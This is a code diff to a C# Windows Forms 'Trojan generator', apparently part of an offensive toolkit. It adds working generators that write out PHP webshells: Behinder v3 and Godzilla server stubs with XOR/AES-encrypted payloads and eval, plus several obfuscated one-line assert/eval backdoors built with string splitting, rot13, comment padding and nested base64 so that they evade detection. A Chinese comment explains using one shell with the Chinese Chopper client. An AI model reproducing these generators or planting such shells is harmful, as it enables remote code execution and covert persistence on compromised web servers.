@@ -1,6 +1,6 @@
 ﻿using C2.Controls;
+using C2.Core;
 using C2.Utils;
-using System;
 using System.Text;
 using System.Windows.Forms;
 
@@ -11,7 +11,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string TrojanType { get => this.trojanComboBox.Text.Trim(); }
         private string Password { get => this.passTextBox.Text.Trim(); }
         private string Key { get => this.keyTextBox.Text.Trim(); }
-        private string Encry { get => this.encryComboBox.Text.Trim(); }
+        private string EncryType { get => this.encryComboBox.Text.Trim(); }
         public TrojanGeneratorForm(string trojanType, bool encry = false)
         {
             InitializeComponent();
@@ -35,6 +35,8 @@ namespace C2.Business.CastleBravo.WebShellTool
         protected override bool OnOKButtonClick()
         {
             this.saveFileDialog1.FileName = this.trojanComboBox.Text;
+            if (TrojanType == "哥斯拉配套Trojan")
+                this.saveFileDialog1.FileName += "_" + this.EncryType;
             this.saveFileDialog1.DefaultExt = ".php";
             if (this.saveFileDialog1.ShowDialog() == DialogResult.OK)
             {
@@ -84,7 +86,7 @@ namespace C2.Business.CastleBravo.WebShellTool
                     ret = GenOneWord9(Password);
                     break;
                 case "哥斯拉配套Trojan":
-                    ret = GenGodzilla(Password);
+                    ret = GenGodzilla(Password, Key, EncryType);
                     break;
                 case "三代冰蝎配套Trojan":
                     ret = GenBehinder3(Password);
@@ -98,12 +100,101 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private string GenBehinder3(string password)
         {
-            throw new NotImplementedException();
+            password = ST.GenerateMD5(password).Substring(0, 16);
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine("<?php")
+              .AppendLine("@error_reporting(0);")
+              .AppendLine("session_start();")
+              .AppendLine(string.Format("    $key=\"{0}\";", password))
+              .AppendLine("    $_SESSION['k']=$key;")
+              .AppendLine("    session_write_close();")
+              .AppendLine("    $post=file_get_contents(\"php://input\");")
+              .AppendLine("    if(!extension_loaded('openssl'))")
+              .AppendLine("    {")
+              .AppendLine("        $t=\"base64_\".\"decode\";")
+              .AppendLine("        $post=$t($post.\"\");")
+              .AppendLine("        ")
+              .AppendLine("        for($i=0;$i<strlen($post);$i++) {")
+              .AppendLine("                 $post[$i] = $post[$i]^$key[$i+1&15]; ")
+              .AppendLine("                }")
+              .AppendLine("    }")
+              .AppendLine("    else")
+              .AppendLine("    {")
+              .AppendLine("        $post=openssl_decrypt($post, \"AES128\", $key);")
+              .AppendLine("    }")
+              .AppendLine("    $arr=explode('|',$post);")
+              .AppendLine("    $func=$arr[0];")
+              .AppendLine("    $params=$arr[1];")
+              .AppendLine("    class C{public function __invoke($p) {eval($p.\"\");}}")
+              .AppendLine("    @call_user_func(new C(),$params);")
+              .AppendLine("?>")
+              ;
+            return sb.ToString();
         }
 
-        private string GenGodzilla(string password)
+        private string GenGodzilla(string password, string key, string encryType)
         {
-            throw new NotImplementedException();
+            key = ST.GenerateMD5(key).Substring(0, 16);
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine("<?php")
+              .AppendLine("@session_start();")
+              .AppendLine("@set_time_limit(0);")
+              .AppendLine("@error_reporting(0);")
+              .AppendLine("function encode($D,$K){")
+              .AppendLine("    for($i=0;$i<strlen($D);$i++) {")
+              .AppendLine("        $c = $K[$i+1&15];")
+              .AppendLine("        $D[$i] = $D[$i]^$c;")
+              .AppendLine("    }")
+              .AppendLine("    return $D;")
+              .AppendLine("}");
+
+            switch (encryType)
+            {
+                case "PHP_XOR_RAW":
+                    sb.AppendLine("$payloadName='payload';")
+                      .AppendLine(string.Format("$key='{0}';", key))
+                      .AppendLine("$data=file_get_contents(\"php://input\");")
+                      .AppendLine("if ($data!==false){")
+                      .AppendLine("    $data=encode($data,$key);")
+                      .AppendLine("    if (isset($_SESSION[$payloadName])){")
+                      .AppendLine("        $payload=encode($_SESSION[$payloadName],$key);")
+                      .AppendLine("        eval($payload);")
+                      .AppendLine("        echo encode(@run($data),$key);")
+                      .AppendLine("    }else{")
+                      .AppendLine("        if (stripos($data,\"getBasicsInfo\")!==false){")
+                      .AppendLine("            $_SESSION[$payloadName]=encode($data,$key);")
+                      .AppendLine("        }")
+                      .AppendLine("    }")
+                      .AppendLine("}");
+                    break;
+                case "PHP_XOR_BASE64":
+                    sb.AppendLine(string.Format("$pass='{0}';", password))
+                      .AppendLine("$payloadName='payload';")
+                      .AppendLine(string.Format("$key='{0}';", key))
+                      .AppendLine("if (isset($_POST[$pass])){")
+                      .AppendLine("    $data=encode(base64_decode($_POST[$pass]),$key);")
+                      .AppendLine("    if (isset($_SESSION[$payloadName])){")
+                      .AppendLine("        $payload=encode($_SESSION[$payloadName],$key);")
+                      .AppendLine("        eval($payload);")
+                      .AppendLine("        echo substr(md5($pass.$key),0,16);")
+                      .AppendLine("        echo base64_encode(encode(@run($data),$key));")
+                      .AppendLine("        echo substr(md5($pass.$key),16);")
+                      .AppendLine("    }else{")
+                      .AppendLine("        if (stripos($data,\"getBasicsInfo\")!==false){")
+                      .AppendLine("            $_SESSION[$payloadName]=encode($data,$key);")
+                      .AppendLine("        }")
+                      .AppendLine("    }")
+                      .AppendLine("}");
+                    break;
+                case "PHP_EVAL_BASE64":
+                    sb.Clear();
+                    sb.AppendLine("<?php")
+                      .AppendLine(string.Format("eval($_POST[\"{0}\"]);", password));
+                    break;
+                default:
+                    break;
+            }
+            return sb.ToString();
         }
 
         private string GenCaesar(string password)
@@ -147,7 +238,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string GenOneWord2(string password)
         {
             // <?php $k="ass"."ert"; @$k(${"_PO"."ST"}['yxs']);?>
-            return "<? php $k" + " = \"ass\".\"e" + "rt\"; @$k(${\"_PO\"." + "\"ST\"}" + string.Format("['{0}']);?>", password);
+            return @"<?php $k" + "=\"ass\".\"e" + "rt\"; @$k(${\"_PO\"." + "\"ST\"}" + string.Format("['{0}']);?>", password);
         }
         private string GenOneWord3(string password)
         {
@@ -166,24 +257,47 @@ namespace C2.Business.CastleBravo.WebShellTool
             sb.Append("<?php function xm")
               .Append("($a){$c=str_rot13('nffreg');")
               .Append("$c($a);}xm($_REQUEST")
-              .Append(string.Format("['{0}']); ?>", password));
+              .Append(string.Format("['{0}']);?>", password));
             return sb.ToString();
         }
         private string GenOneWord6(string password)
         {
-            throw new NotImplementedException();
+            // 这个版本确实难以描述
+            return "<?php @$_=\"s\".\"s\"./*-/*-*/\"e\"./*-/*-*/\"r\";@$_=/*-/*-*/\"a\"./*-/*-*/$_./*-/*-*/\"t\";@$_/*-/*-*/($/*-/*-*/{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}[/*-/*-*/'" + password + "'/*-/*-*/]);?>";
         }
         private string GenOneWord7(string password)
         {
-            throw new NotImplementedException();
+            // <?php $a=preg_filter('/\s+/','','as s er t');@$a($_REQUEST['yxs']);?>
+            return string.Format(@"<?ph" + @"p $a=pre" + @"g_filter('/\s+/','','as" + @" s er t');@$a($_R" + @"EQUES" + @"T['{0}']);?>", password);
         }
         private string GenOneWord8(string password)
         {
-            throw new NotImplementedException();
+            string vvnr1 = "UUdWMllX";
+            string hitq5 = "d29KRjlR";
+            string qajd2 = "VDFOVVd5";
+            string itfh2 = ST.EncodeBase64(ST.EncodeBase64(string.Format("@eval($_POST['{0}']);", password)))
+                             .Substring(vvnr1.Length)
+                             .Substring(hitq5.Length)
+                             .Substring(qajd2.Length);
+
+
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine(@"<?php ")
+              .AppendLine(string.Format("$qajd2=\"{0}\";$vvnr1=\"{1}\";$hitq5=\"{2}\";$itfh2=\"{3}\";", qajd2, vvnr1, hitq5, itfh2))
+              .AppendLine("$akmi4 = str_replace(\"eu2\",\"\",\"eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce\");")
+              .AppendLine("$hygg4 = $akmi4(\"so0\", \"\", \"so0baso0sso0e6so04so0_so0dso0eso0cso0oso0dso0e\");")
+              .AppendLine("$gzsw5 = $akmi4(\"qik6\",\"\",\"qik6cqik6reqik6atqik6eqik6_fqik6uncqik6tqik6ioqik6n\");")
+              .AppendLine("$foxl6 = $gzsw5('', $hygg4($hygg4($akmi4(\"$; *,.\", \"\", $vvnr1.$hitq5.$qajd2.$itfh2))));")
+              .AppendLine("$foxl6();")
+              .AppendLine("?>");
+
+            return sb.ToString();
         }
         private string GenOneWord9(string password)
         {
-            throw new NotImplementedException();
+            // 在菜刀里写 http://site/webshell.php?2=assert 密码是yxs
+            // <?php ($_=@$_GET[2]).@$_($_POST['yxs'])?>
+            return string.Format(@"<?ph" + @"p ($_=@$_GET" + "[2]).@$_($_PO" + @"ST['{0}'])?>", password);
         }
 
     }
